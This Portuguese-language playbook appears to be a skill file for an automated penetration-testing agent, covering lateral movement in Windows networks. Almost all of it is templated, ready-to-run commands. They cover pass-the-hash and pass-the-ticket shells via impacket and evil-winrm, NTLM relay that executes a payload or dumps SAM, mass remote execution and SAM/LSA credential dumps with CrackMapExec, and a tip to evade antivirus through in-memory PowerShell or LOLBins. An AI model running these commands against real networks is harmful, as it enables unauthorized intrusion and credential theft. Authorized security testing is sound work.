---
name: lateral_movement_psexec
phase: 5_post_exploitation
tools: [impacket-psexec, impacket-wmiexec, impacket-smbexec, crackmapexec, evil-winrm]
dependencies: [credentials_found]
mitre_tactic: TA0008 (Lateral Movement)
---

# Objetivo
Realizar movimento lateral em redes Windows utilizando credenciais obtidas (senha, hash NTLM ou ticket Kerberos) para acessar outros sistemas via SMB, WMI, WinRM e tecnicas de Pass-the-Hash / Pass-the-Ticket.

# Condicoes de Execucao
- Credenciais validas foram obtidas (senha em texto claro, hash NTLM ou ticket Kerberos).
- Outros hosts na rede foram identificados.
- Pelo menos uma das portas 135 (WMI), 445 (SMB) ou 5985/5986 (WinRM) esta acessivel nos alvos.

# Comandos e Sintaxe

## 1. Enumeracao de Hosts Acessiveis com CrackMapExec

### Verificar SMB
```bash
crackmapexec smb {target_ip}/24 -u {username} -p {password} 2>&1 | tee {workspace}/cme_smb_enum.txt
```

### Verificar WinRM
```bash
crackmapexec winrm {target_ip}/24 -u {username} -p {password} 2>&1 | tee {workspace}/cme_winrm_enum.txt
```

### Verificar credenciais de Admin Local
```bash
crackmapexec smb {target_ip}/24 -u {username} -p {password} --local-auth 2>&1 | tee {workspace}/cme_local_admin.txt
```

### Enumeracao de Shares
```bash
crackmapexec smb {target_ip} -u {username} -p {password} --shares 2>&1 | tee {workspace}/cme_shares.txt
```

### Enumeracao de Usuarios Logados
```bash
crackmapexec smb {target_ip} -u {username} -p {password} --loggedon-users 2>&1 | tee {workspace}/cme_loggedon.txt
```

## 2. Pass-the-Hash com CrackMapExec
```bash
crackmapexec smb {target_ip} -u {username} -H {ntlm_hash} 2>&1 | tee {workspace}/cme_pth.txt
crackmapexec smb {target_ip} -u {username} -H {ntlm_hash} --local-auth -x "whoami" 2>&1 | tee {workspace}/cme_pth_exec.txt
```

## 3. Impacket-PsExec - Shell Interativa via SMB

### Com senha
```bash
impacket-psexec {domain}/{username}:{password}@{target_ip} 2>&1 | tee {workspace}/psexec_session.txt
```

### Com hash (Pass-the-Hash)
```bash
impacket-psexec {domain}/{username}@{target_ip} -hashes :{ntlm_hash} 2>&1 | tee {workspace}/psexec_pth.txt
```

## 4. Impacket-WmiExec - Execucao via WMI

### Com senha
```bash
impacket-wmiexec {domain}/{username}:{password}@{target_ip} 2>&1 | tee {workspace}/wmiexec_session.txt
```

### Com hash
```bash
impacket-wmiexec {domain}/{username}@{target_ip} -hashes :{ntlm_hash} 2>&1 | tee {workspace}/wmiexec_pth.txt
```

### Execucao de comando unico
```bash
impacket-wmiexec {domain}/{username}:{password}@{target_ip} "whoami /all" 2>&1 | tee {workspace}/wmiexec_whoami.txt
```

## 5. Impacket-SmbExec - Execucao via SMB
```bash
impacket-smbexec {domain}/{username}:{password}@{target_ip} 2>&1 | tee {workspace}/smbexec_session.txt
impacket-smbexec {domain}/{username}@{target_ip} -hashes :{ntlm_hash} 2>&1 | tee {workspace}/smbexec_pth.txt
```

## 6. Evil-WinRM - Shell via WinRM

### Com senha
```bash
evil-winrm -i {target_ip} -u {username} -p {password} 2>&1 | tee {workspace}/evilwinrm_session.txt
```

### Com hash
```bash
evil-winrm -i {target_ip} -u {username} -H {ntlm_hash} 2>&1 | tee {workspace}/evilwinrm_pth.txt
```

### Upload e download de arquivos via Evil-WinRM
```bash
evil-winrm -i {target_ip} -u {username} -p {password} -e {workspace}/ -s {workspace}/ 2>&1 | tee {workspace}/evilwinrm_with_scripts.txt
```

## 7. Pass-the-Ticket com Impacket

### Exportar ticket Kerberos
```bash
impacket-getTGT {domain}/{username}:{password} -dc-ip {target_ip} 2>&1 | tee {workspace}/getTGT_output.txt
export KRB5CCNAME={workspace}/{username}.ccache
```

### Usar ticket para PsExec
```bash
impacket-psexec {domain}/{username}@{target_ip} -k -no-pass 2>&1 | tee {workspace}/psexec_ptt.txt
```

### Usar ticket para WmiExec
```bash
impacket-wmiexec {domain}/{username}@{target_ip} -k -no-pass 2>&1 | tee {workspace}/wmiexec_ptt.txt
```

## 8. SMB Relay com Impacket
```bash
impacket-ntlmrelayx -t {target_ip} -smb2support -e {workspace}/payload.exe 2>&1 | tee {workspace}/ntlmrelay_output.txt
```

### Relay para dump de SAM
```bash
impacket-ntlmrelayx -t {target_ip} -smb2support --dump-sam 2>&1 | tee {workspace}/ntlmrelay_sam.txt
```

## 9. Execucao Remota em Massa com CrackMapExec
```bash
crackmapexec smb {workspace}/targets.txt -u {username} -p {password} -x "hostname && whoami" 2>&1 | tee {workspace}/cme_mass_exec.txt
```

### Dump de SAM remoto
```bash
crackmapexec smb {target_ip} -u {username} -p {password} --sam 2>&1 | tee {workspace}/cme_sam_dump.txt
```

### Dump de LSA
```bash
crackmapexec smb {target_ip} -u {username} -p {password} --lsa 2>&1 | tee {workspace}/cme_lsa_dump.txt
```

## 10. Verificacao de Conectividade Pos-Movimento
```bash
crackmapexec smb {target_ip} -u {username} -p {password} -x "ipconfig /all && net user && net group \"Domain Admins\" /domain" 2>&1 | tee {workspace}/cme_post_lateral.txt
```

# Analise de Resultados
- **CrackMapExec mostra "Pwn3d!":** Credenciais tem acesso admin local no alvo. Pode executar comandos como SYSTEM.
- **PsExec retornou shell:** Shell interativa como SYSTEM obtida. Prosseguir com pos-exploracao.
- **WmiExec retornou shell:** Shell como o usuario especificado. Util quando PsExec falha.
- **Evil-WinRM conectou:** Shell interativa com suporte a upload/download e scripts PowerShell.
- **Pass-the-Hash funcionou:** Nao e necessario quebrar hashes. Acesso direto com NTLM hash.
- **SMB Relay capturou hashes:** Hashes retransmitidos para outro host. Verificar se obteve acesso.
- **SAM/LSA dump obtido:** Novos hashes para testar em outros hosts (password spraying).

# Proximos Passos
- Acesso obtido em novo host: acione `windows_privilege_escalation` se necessario.
- Novos hashes obtidos: acione `hash_dumping_and_cracking` e tente em mais hosts.
- Se Domain Admin for alcancado, acione `hash_dumping_and_cracking` para dump de NTDS.dit.
- Documente todos os caminhos de movimento lateral para o relatorio.

# Tratamento de Erros
- Se PsExec falhar com "access denied", tente WmiExec ou SmbExec como alternativa.
- Se WinRM nao conectar, verifique se a porta 5985/5986 esta aberta e o servico habilitado.
- Se Pass-the-Hash falhar, pode haver "LocalAccountTokenFilterPolicy" restritivo. Tente com credenciais em texto claro.
- Se CrackMapExec mostrar "STATUS_LOGON_FAILURE", as credenciais sao invalidas para o alvo.
- Se SMB relay falhar, verifique se SMB signing esta desabilitado no alvo: `crackmapexec smb {target_ip} --gen-relay-list`.
- Se o antivirus bloquear ferramentas, tente executar em memoria via PowerShell ou use LOLBins.
